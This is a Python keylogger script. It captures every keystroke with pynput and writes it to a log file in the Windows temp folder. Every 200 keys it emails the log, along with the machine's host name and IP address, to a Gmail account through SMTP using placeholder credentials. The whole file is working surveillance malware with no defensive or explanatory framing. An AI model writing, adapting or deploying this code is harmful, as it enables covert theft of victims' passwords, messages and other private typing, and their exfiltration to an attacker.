from pynput.keyboard import Key, Listener
import socket
host_name = socket.gethostname()
ip_address = socket.gethostbyname(host_name)
import os
import email, smtplib, ssl

from email import encoders
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
log_dir = str(os.getenv('temp')) + '\\'

x = open(log_dir + 'keylogs.txt', 'w')
x.close()
z = 0
def on_press(key):
    y = 9
    if key:
        global z 
        z = z + 1
        x = open(log_dir + 'keylogs.txt', 'a')
        if key == Key.enter:
            x.write("\n")
        elif key == Key.caps_lock:
            if y == 9:
                y = y+1
            else:
                y = 9
        elif key == Key.space:
            x.write(" ")
        else:
            if y == 10:
                x.write(str(key)[1].upper())
            else:
                x.write(str(key)[1])
        if z > 200:
            send_email(host_name, ip_address)
            z=0
def send_email(host_name, ip_address):
    port = 465
    sender_email = "ggg@gmail.com"
    receiver_email = "ggg@gmail.com"

    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    files = [log_dir +"keylogs.txt"]
    for f in files or []:
       with open(f, "rb") as fil:
           part = MIMEApplication(
               fil.read(),
               Name=basename(f)
           )
       # After the file is closed
       part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
       message.attach(part)
    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(sender_email, "pwd")
        server.sendmail(sender_email, receiver_email,message.as_string())
with Listener(on_press=on_press) as listener:
    listener.join()
